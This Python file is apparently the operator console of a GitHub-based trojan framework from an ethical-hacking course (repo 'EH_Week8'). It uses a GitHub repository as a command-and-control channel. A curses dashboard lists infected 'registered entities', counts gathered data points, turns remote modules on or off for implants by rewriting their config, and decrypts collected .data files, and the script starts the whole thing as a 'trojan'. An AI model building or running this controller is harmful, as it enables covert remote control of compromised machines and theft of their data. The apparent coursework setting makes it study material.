import base64
import github3
import importlib
import json
import random
import sys
import threading
import time
import uuid

from datetime import datetime

import os
import curses


from decryptor import decrypt_file

def github_connect():
    #return None
    with open('mytoken.txt') as f:
        token = f.read().strip()
    user = 'WatcherWhale'
    sess = github3.login(token=token)
    return sess.repository(user, 'EH_Week8')


def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

def get_file_content(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}')

class Monitor:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()

    def get_registered(self):
        return list(filter(lambda x: x[0] != ".gitkeep", self.repo.directory_contents("data/registered")))

    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))
        return config
    def save_config(self, data):
        message = "Update config"
        remote_path = f'config/{self.config_file}'

        content = get_file_content("config", self.config_file, self.repo)
        content.update(message, json.dumps(data).encode())
    def get_modules(self):
        return list(map(lambda x: x[0], self.repo.directory_contents("modules")))

    def run(self):
        win = curses.initscr()
        curses.noecho()
        #curses.cbreak()
        win.keypad(1)
        win.nodelay(True)

        curses.start_color()
        curses.use_default_colors()

        for i in range(0, curses.COLORS):
            curses.init_pair(i + 1, i, -1)

        threading.Thread(target=self.run_screen, args=(win,)).run()


    def run_screen(self, win):
        while True:
            config = self.get_config()
            registered = self.get_registered()

            rows, cols = win.getmaxyx()

            win.clear()
            win.addstr(0,0, "Current Time:")
            win.addstr(0, len("Current Time: "), str(datetime.now()), curses.color_pair(50))

            win.addstr(2,0, "Statistics:", curses.color_pair(69) | curses.A_BOLD)

            win.addstr(3, 4, "Enabled Modules: ", curses.color_pair(83))
            win.addstr(3, 4 + len("Enabled Modules: "), str(len(config)), curses.color_pair(83) | curses.A_UNDERLINE | curses.A_BOLD)

            modules = self.get_modules()
            for i in range(len(modules)):
                cmd = modules[i].split(".py")[0]

                if len(list(filter(lambda x: x["module"] == cmd, config))) > 0:
                    win.addstr(3 + i + 1, 8, " " + cmd, curses.color_pair(3))
                else:
                    win.addstr(3 + i + 1, 8, " " + cmd, curses.color_pair(10))


            win.addstr(4 + len(modules), 4, "Registered Entities: ", curses.color_pair(83))
            win.addstr(4 + len(modules), 4 + len("Registered Entities: "), str(len(registered)), curses.color_pair(83) | curses.A_UNDERLINE | curses.A_BOLD)
            for i in range(len(registered)):
                win.addstr(5 + len(modules) + i, 8, "ﮊ " + registered[i][0])

            win.addstr(5 + len(modules) + len(registered), 4, "Data Points Gathered: ", curses.color_pair(83))
            win.addstr(5 + len(modules) + len(registered), 4 + len("Data Points Gathered: "), str(len(self.repo.directory_contents("data/config"))), curses.color_pair(83) | curses.A_UNDERLINE | curses.A_BOLD)


            win.addstr(rows-1, 0, "Commands:  [P] git pull  [E] Enable/Disable Module  [D] Decrypt All Files  [Q] Exit")

            key = win.getch()

            if key == ord('p'):
                os.system("git pull")
                win.clear()
            elif key == ord('e'):
                win.clear()
                self.choose_module(win, modules, config)
                win.clear()
            elif key == ord('d'):
                for file in os.listdir("data/config"):
                    file_path = os.path.join("data/config", file)
                    if os.path.splitext(file_path)[1] == ".data":
                        decrypt_file(file_path)
            elif key == ord('q'):
                break

            time.sleep(1)
            win.refresh()

    def choose_module(self, win ,modules, config):
        win.nodelay(False)
        curses.echo()

        modules = list(map(lambda x: x.split(".py")[0], modules))

        while True:
            win.addstr(0,0, "All modules: ")

            for i in range(len(modules)):
                win.addstr(i + 2,0, modules[i])

            win.addstr(2 + len(modules),0, "Type module name to toggle or 'exit' to exit: ")


            inp = win.getstr().decode().strip().lower()
            win.addstr(0,0, inp)

            if inp == "exit":
                break
            elif inp in modules:
                if inp in list(map(lambda x: x["module"], config)):
                    config = list(filter(lambda x: x["module"] != inp, config))
                else:
                    config.append({"module": inp})

            win.clear()
            win.refresh()

        self.save_config(config)
        curses.noecho()
        win.nodelay(True)


if __name__ == '__main__':
    trojan = Monitor('config')
    trojan.run()
